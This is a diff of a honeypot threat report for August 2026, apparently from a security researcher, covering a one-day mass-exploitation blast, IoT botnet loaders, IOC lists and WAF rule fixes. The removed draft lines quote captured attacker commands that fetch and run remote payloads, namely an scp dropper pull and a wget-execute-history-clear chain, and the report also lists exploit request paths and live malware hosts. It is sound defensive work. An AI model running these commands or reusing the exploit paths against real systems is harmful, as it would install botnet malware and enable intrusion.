@@ -1,148 +1,130 @@
-# WebSpeare + Cowrie — Threat Report, August 2026 (MTD)
+# WebSpeare + Cowrie — Threat Report, August 2026 (FULL MONTH)
 
-**Reporting window:** 2026-08-01 → 2026-08-19
+**Reporting window:** 2026-08-01 → 2026-08-31 (finalized 2026-09-11; supersedes the mid-month MTD draft)
 **Sensors:** Cowrie SSH/Telnet (`do-us/new-york`) + 2× WebSpeare web nodes (`192.168.67.2/.3`)
-**Volume:** ~885K events · **Maintainer:** Oak Atsume (DC801)
-**Source:** Graylog (GELF feed)
+**Maintainer:** Oak Atsume (DC801) · **Source:** Graylog (GELF feed)
 
 ---
 
 ## Executive summary
 
-- **RedTail changed how it delivers payloads.** It now writes an embedded **OpenSSH private key** to disk and pulls the dropper over **`scp` from `dlr@217.60.195.113`** (HTTPS wget/curl fallback). The private key + operator username are captured in our logs — a strong pivot/IOC.
-- **A fresh crop of IoT botnet loaders** rotated in (July's hosts are gone): **"iran"** (`165.22.69.214`), **"Exodus"** (`176.65.139.228:6677`), plus `103.77.246.150` and `83.168.69.141`. Only **RedTail** (`217.60.195.113`) persists across both months.
-- **The `185.177.72.0/24` web actor is still here and added new modules** — a **WordPress GravitySMTP** unauth cred-leak and **Cloud-Metadata SSRF (IMDS theft)**, run together as a coordinated **Aug 11–12 cloud-credential push**.
-- **Two persistent SSH operations** continue from July: `91.92.40–47.x` (brute + malware host, expanded to three /24s) and `45.153.34.x`. A new single-IP brute — `189.85.145.83` (Brazil, PERSIS INTERNET) — drove the Aug 14 traffic spike.
-- **WAF:** the web nodes picked up new signatures and the interactive decoys are firing, but a **phpinfo discovery sweep** and **generic PHP recon scripts** were slipping through, and the July gap-rules still aren't live on the sensors (deploy lag). Addressed below.
+- **The month is dominated by a single-day, single-source event.** On **Aug 24** one host — **`194.180.49.37` (MEVSPACE sp. z o.o., PL/BG)** — fired **~1.32M web requests in one day**, throwing the entire exploit catalog at the honeypot. That one IP is ~1.3M of the month's ~2.6M web events and single-handedly pushed **Bulgaria to the #1 origin country**.
+- **Two "new" exploit signatures appeared — but only from that one scanner.** **Log4Shell / JNDI-in-headers (44,140)** and **Server-Side Template Injection (12,433)** fired **exclusively on Aug 24** from `194.180.49.37`. They represent one actor's toolkit, not broad campaign adoption.
+- **Our WAF upgrades went live and are working.** The **config-secrets decoy is engaging attackers** — 4,777 canaried `.env` serves — and the new App-Config rule (983) plus PHPInfo decoy broadening are all firing. The July/August gap work is deployed.
+- **No LinkFlow / CVE-2026-5027 traffic** has reached these sensors (searched full-text + raw path/body/URL, ~75 days). The **only CVE the sensors tag by number remains CVE-2026-24061** (telnet arg-injection, 70 hits).
+- **September is escalating hard** (166K–337K events/day vs August's ~70K baseline) — flagged here as a forward-looking warning; it will be the September report's focus.
 
 ---
 
 ## 1. Data quality & caveats
 
-- **Aug 1–6 collection outage.** Volume ran ~1.5K/day vs a ~70K/day baseline. **Cause (confirmed by maintainer): the relay tunnel went dark**, and a batch of data for an **Asian ISP was lost**. **No indicators of compromise** — this is a collection gap, not an incident.
-- **Consequence for this report:** August's **APAC geography is under-counted** (Vietnam/Singapore/Korea/India/Indonesia are present but low). Treat regional totals as a floor, not a true distribution.
-- Service resumed normally on **Aug 7**.
+- **Aug 1–6:** tail end of the collection outage (relay tunnel drop + lost Asian-ISP data — confirmed by maintainer, **no compromise**). Volumes ~1.5K/day.
+- **Aug 25–26, 29–30:** **zero events** — further collection gaps (tunnel/pipeline down), not quiet periods.
+- **Aug 31:** near-zero (378).
+- **The Aug 24 mega-spike is real, not a logging artifact** — it's one host's exploit blast (see §3), but it badly skews every month-total aggregate. **Read August rule/geo totals as "baseline + one Aug-24 blast," not steady state.**
 
 ---
 
-## 2. Volume & timeline
+## 2. Volume timeline (daily, all sensors)
 
 ```
-Aug01 ▌ 1.4   ┐
-Aug02 ▌ 1.6   │  relay tunnel dark /
-Aug03 ▌ 1.7   │  Asian-ISP data lost
-Aug04 ▌ 1.4   │  (collection gap, no compromise)
-Aug05 ▌ 1.5   │
-Aug06 ██ 7.5  ┘  recovery begins
-Aug07 ████████████████ 76.5
-Aug08 ████████████████ 72.9
-Aug09 ████████████ 55.7
-Aug10 ████████████████ 75.7
-Aug11 ████████████████ 76.3   ← GravitySMTP + IMDS-SSRF push begins
-Aug12 █████████████████ 77.1
-Aug13 ████████████ 56.8
-Aug14 ████████████████████████████ 127.9   ← spike (see below)
-Aug15 ██████████████ 63.9
-Aug16 █████████ 44.0
-Aug17 ████████████████ 73.3
-Aug18 ████████████ 54.3
-Aug19 ███ 15.4 (partial)
+Aug04 ▏ 1.1     Aug13 ██ 56.8      Aug22 ██ 76.8
+Aug05 ▏ 1.5     Aug14 ████ 127.9   Aug23 ███ 108.7
+Aug06 ▏ 7.5     Aug15 ██ 63.9      Aug24 ████████████████████████ 1,425.5  ← single-host blast
+Aug07 ██ 76.5   Aug16 █ 44.0       Aug25   0   (outage)
+Aug08 ██ 72.9   Aug17 ██ 73.3      Aug26   0   (outage)
+Aug09 █ 55.7    Aug18 █ 54.3       Aug27 ██ 63.2
+Aug10 ██ 75.7   Aug19 ██ 75.9      Aug28 █ 32.7
+Aug11 ██ 76.3   Aug20 ███ 98.1     Aug29 0 / Aug30 0 (outage)
+Aug12 ██ 77.1   Aug21 ██ 61.7      Aug31 ▏ 0.4
 ```
-
-**Aug 14 spike (128K, ~2×) attribution:** a **web surge to ~28K** (≈4× normal — the returning `185.177.72/24` wave) layered on top of a single Brazilian SSH brute-forcer, **`189.85.145.83`** (~46K events this month, concentrated that day).
-
----
-
-## 3. Geography & infrastructure
-
-**Top origins (August, APAC under-counted):** Netherlands (212K), United States (115K), Bulgaria (59K), Sweden (59K), France (55K), **Brazil (55K ↑)**, United Kingdom (55K), Romania (31K), Vietnam (30K), Germany (30K), **Nigeria (21K ↑ — newly prominent)**, Singapore (20K).
-
-Infrastructure remains overwhelmingly **cheap/bulletproof VPS** (Pfcloud, Bullet Group, Bucklog, DigitalOcean, Alfahost, Cyberzone). Brazil's rise tracks the `189.85.145.83` brute; Nigeria is a new entrant worth watching.
+(values in thousands; Aug 24 bar truncated — it is ~10× the next-highest day)
 
 ---
 
-## 4. New operations (with timelines)
+## 3. The Aug 24 event — single-host mass exploitation  *(headline)*
 
-### 4.1 RedTail — evolved delivery via SSH key + scp  *(highlight)*
-RedTail no longer just `wget`/`curl`s its dropper. It now embeds an **OpenSSH ed25519 private key**, writes it to `key.ppk`, and runs:
-```
-scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh   # HTTPS wget/curl fallback
-```
-The **full private key and the operator username `dlr@217.60.195.113`** are in `cowrie.command.input`. Same C2 as July, now authenticating to its own dropper host. Also still tagging telnet sessions with `echo TEL_OK` / `redtail_bot_telnet_ok`.
+| | |
+|---|---|
+| **Source** | `194.180.49.37` — **1,321,702** web requests (99.96% of the day's web traffic) |
+| **ASN / geo** | **MEVSPACE sp. z o.o.** (Polish low-cost/bulletproof VPS), geo-tagged Bulgaria |
+| **User-Agent** | *none* (blank) — automated tooling, no browser pretense |
+| **Window** | concentrated burst on 2026-08-24 |
 
-### 4.2 New IoT botnet loaders
-| Operation | Host | Payloads |
-|---|---|---|
-| **"iran"** | `165.22.69.214` (DigitalOcean) | `iran.{x86_64,aarch64,m68k,mips,mipsel}`, `cat.sh` |
-| **Exodus** | `176.65.139.228:6677` | `Exodus.sh`, `bins/{mips,mipsel,x32,x86}`; runs `history -c` |
-| loader | `103.77.246.150` | `get.sh`, `loader.sh`, `mips.sh` |
-| loader | `83.168.69.141` | `armv7l` |
+**What it threw (all on Aug 24):**
+| Signature | Hits |
+|---|---|
+| Directory Traversal Attempt | 441,941 |
+| Cloud Metadata SSRF — IMDS Credential Theft | 281,122 |
+| Log4Shell — JNDI Injection in Headers | 44,140 *(first appearance)* |
+| Server-Side Template Injection (SSTI) | 12,433 *(first appearance)* |
+| + Secret File Enum, LFI, PHP stream-wrapper injection, etc. | remainder |
 
-### 4.3 `185.177.72.0/24` — persistent web actor, new modules
-Same subnet as July (7+ IPs, ~38K requests in August). Added two exploits, used together in a **coordinated Aug 11–12 cloud-credential push**:
-- **WordPress GravitySMTP unauth cred-leak** — `GET /wp-json/gravitysmtp/v1/tests/mock-data` — Aug 11 (134), Aug 12 (68), Aug 17 (142).
-- **Cloud-Metadata SSRF / IMDS credential theft** — Aug 11 (128), Aug 12 (64).
+**Read:** a single rented host running an all-in-one web-vuln scanner (traversal → cloud-cred theft → Log4Shell → SSTI) at very high rate. High volume, low sophistication, no evasion. The IMDS-SSRF focus shows the operator is specifically hunting **cloud credentials**. Worth an abuse report to MEVSPACE and a firewall drop for the IP/ASN.
 
 ---
 
-## 5. Persistent operators (carried from July)
+## 4. New CVEs / exploit signatures observed
 
-- **`91.92.40–47.x`** — SSH brute-force **and** malware distribution host; expanded across three /24s (~40K events).
-- **`45.153.34.x`** — dedicated SSH brute-force /24.
-- **`185.177.72.x`** — web recon + exploitation (see 4.3).
-- **RedTail** C2 `217.60.195.113`.
-
-New heavy hitters: SSH — `189.85.145.83` (BR), `159.223.97.144`, `165.154.177.119`, `77.239.124.240/.249`; Web — `130.12.180.77` (26K single IP).
+- **Requested — LinkFlow / CVE-2026-5027: NOT PRESENT.** Full-text and raw path/body/URL searches over ~75 days returned nothing. (If it targets an endpoint whose URI doesn't contain "linkflow", it could be sitting unlabeled — provide the path/param signature and we'll re-sweep.)
+- **Only numeric-CVE tag in the data:** `CVE-2026-24061` (telnet `USER -f root` arg-injection) — 70 hits, low-and-slow, rotating sources; ongoing from June.
+- **CVE-relevant *signatures* seen (by rule name):** Log4Shell/JNDI = **CVE-2021-44228** (Aug 24 only), SSTI, Cloud-Metadata SSRF (IMDS theft), WordPress GravitySMTP probe (366), Hikvision **CVE-2021-36260** (1,027), RedTail **CVE-2024-4577** (578), PHPUnit **CVE-2017-9841** (decoy, 4,924).
+- **Takeaway on "newer CVEs":** attackers here are not leading with fresh 2026 CVEs — the volume is old, reliable, high-yield bugs (Log4Shell, traversal, IMDS SSRF) plus commodity credential harvesting. The newest thing observed is the telnet CVE-2026-24061, still marginal.
 
 ---
 
-## 6. SSH honeypot highlights
+## 5. Geography (⚠️ skewed by the Aug 24 host)
 
-- **Successful logins** skew to `admin`, `oracle`, `steam`, `trader`, `root`. The hardcoded IoT credential **`3245gs5662d34`** (152 successes) persists — a reliable botnet fingerprint.
-- **Post-login TTPs:** IoT recon (`cat /proc/*`, `/bin/busybox TEST`), the RedTail scp/key delivery (4.1), and Exodus (`wget http://176.65.139.228:6677/Exodus.sh; ./Exodus.sh; history -c`).
-- **Telnet CVE-2026-24061** (`USER -f root` arg injection) continues at low volume (6 attempts) from rotating hosts.
+Bulgaria (1.52M) — **almost entirely `194.180.49.37`**; strip that and the real leaders are US (486K), Netherlands (414K), UK (243K), Vietnam (154K), France (147K), Indonesia (134K), Brazil (123K), India (96K). Infrastructure remains cheap/bulletproof VPS (MEVSPACE, Pfcloud, Bullet Group, DigitalOcean).
 
 ---
 
-## 7. WAF coverage — gaps found & closed
+## 6. SSH / Cowrie highlights
 
-**Found missed in August (`NOT _exists_:waf`):**
-1. **phpinfo discovery sweep** — dozens of prefixed variants (`/cpanel/phpinfo.php`, `/plesk/phpinfo.php`, `/old/phpinfo.php`, `/php_info.php`, `/cgi-bin/phpinfo.cgi`, …). The old decoy only matched three exact paths.
-2. **Generic PHP diagnostic/recon scripts** — `/debug.php`, `/server.php`, `/sys.php`, `/env.php`, `/status.php`, `/i.php`, `/db.php`, `/adminer.php`.
-3. **Deploy lag** — `/appsettings.json`, `/config/settings.ini`, `rtsp://…` were *still* in the miss bucket even though rules for them exist in the repo (`observed-2026-07-gaps.json`, `observed-2026-h1-gaps.json`). This is a **sensor deployment lag, not a missing signature.**
-
-**Closed this cycle:**
-- **Broadened `PHPInfoDecoy`** to match phpinfo-family basenames under *any* path prefix → the whole sweep now lands on the interactive fake-phpinfo decoy instead of slipping past.
-- **New rule** `observed-2026-08-gaps.json` → *"PHP Diagnostic / Recon Script Probe"* classifies the generic PHP recon scripts (medium).
-
-> **Action required:** redeploy/restart the live sensors so the repo ruleset (July + August gap files, broadened decoy) actually takes effect, then re-run the `NOT _exists_:waf` query in ~a week to measure lift.
+- **Top credential-stuffer:** `176.53.159.196` — **1,127 successful logins** (dominant brute source).
+- **Persistent brute infra:** `91.92.40.x`, `193.32.162.x`, `195.178.110.x`.
+- **Malware loaders pulled post-login** (carryover + new):
+  - **new:** `213.232.114.14/handshakebins.sh`; `103.77.246.150:8081/run.sh`
+  - **continuing:** "iran" (`165.22.69.214/iran.{x86_64,aarch64,m68k,mips,mipsel}`), Exodus (`176.65.139.228:6677`), `83.168.69.141/armv7l`
+- **RedTail** still active via HTTP client (1,262) and its scp/SSH-key delivery (see August MTD notes).
 
 ---
 
-## 8. IOC appendix
+## 7. WAF status — upgrades confirmed live ✅
 
-**C2 / operator**
-- `217.60.195.113` — RedTail C2/dropper; scp user `dlr@`; serves `/sh`
-- (RedTail SSH private key material present in `cowrie.command.input` — extract for fingerprinting/pivoting)
+The redeploy landed. Now firing in production:
+- **Decoy-Config/Secret Harvest** — 4,777 canaried `.env` serves (the `185.177.72/24` secret-harvest actor is now eating fake creds). *Reminder: refresh the canary tokens as planned.*
+- **App Config & Secret File Disclosure** rule — 983.
+- **Decoy-PHPInfo** — 1,014 (broadened matcher working across prefixes).
+- New coverage also live: Log4Shell/JNDI, SSTI, LFI/RFI PHP stream-wrapper, IMDS SSRF, GravitySMTP.
 
-**Malware distribution hosts**
-- `165.22.69.214` (iran) · `176.65.139.228:6677` (Exodus) · `103.77.246.150` · `83.168.69.141`
+**Still open (minor):** GravitySMTP rule misses the `?rest_route=/gravitysmtp/...` permalink-off form (and the same evasion applies to other `/wp-json/*` rules). Tightening proposed previously; not yet applied.
 
-**High-volume attackers**
-- SSH: `189.85.145.83` (BR), `159.223.97.144`, `165.154.177.119`, `91.92.40–47.x`, `45.153.34.x`, `77.239.124.240/.249`
-- Web: `130.12.180.77`, `185.177.72.0/24`
+---
 
-**Exploits observed**
-- WordPress GravitySMTP (`/wp-json/gravitysmtp/v1/tests/mock-data`) · Cloud-Metadata SSRF (IMDS) · Telnet CVE-2026-24061 · Hikvision CVE-2021-36260
+## 8. IOC appendix (August)
 
-**Credential fingerprint**
-- `3245gs5662d34` (hardcoded IoT botnet password)
+**Mass web exploitation**
+- `194.180.49.37` (MEVSPACE) — 1.32M-req single-day multi-exploit blast; IMDS-cred focus → **recommend drop + abuse report**
+
+**Malware distribution**
+- `213.232.114.14` (handshakebins.sh) · `103.77.246.150(:8081)` · `165.22.69.214` (iran) · `176.65.139.228:6677` (Exodus) · `83.168.69.141`
+
+**SSH brute**
+- `176.53.159.196` (1,127 successful logins) · `91.92.40.x` · `193.32.162.x` · `195.178.110.x`
+
+**Persistent web actor**
+- `185.177.72.0/24` (secret-harvest; now engaging the config-secrets decoy) · `130.12.180.77`
+
+**CVE/exploit signatures**
+- CVE-2021-44228 (Log4Shell) · CVE-2021-36260 (Hikvision) · CVE-2024-4577 (RedTail) · CVE-2017-9841 (PHPUnit) · CVE-2026-24061 (telnet) · GravitySMTP · IMDS SSRF · SSTI
 
 ---
 
 ## 9. Recommendations
 
-1. **Redeploy the sensors** — the single highest-leverage action; multiple written rules aren't live.
-2. **Extract & fingerprint the RedTail SSH key** — check for reuse across sessions/other C2s; it's a strong pivot.
-3. **Notify/monitor** the GravitySMTP + IMDS-SSRF push — consider a decoy that serves canaried SMTP creds to the `185.177.72/24` actor.
-4. **Passive OSINT refresh** on the new infra (`165.22.69.214`, `176.65.139.228`, `189.85.145.83`) as done in July.
+1. **Drop `194.180.49.37` / rate-limit the MEVSPACE ASN**, and file an abuse report — one host produced half the month's traffic.
+2. **Refresh the canary tokens** in the config-secrets decoy (planned) — it's actively being harvested, so live canarytokens would start yielding phone-home attribution.
+3. **Apply the GravitySMTP `?rest_route=` hardening** across `/wp-json/*` rules.
+4. **Watch September closely** — daily volume is already 2–5× August baseline; the next report should lead with it.
+5. **LinkFlow/CVE-2026-5027:** if you have the endpoint/param signature, send it and we'll sweep the untagged bucket and add a rule if it's landing here.
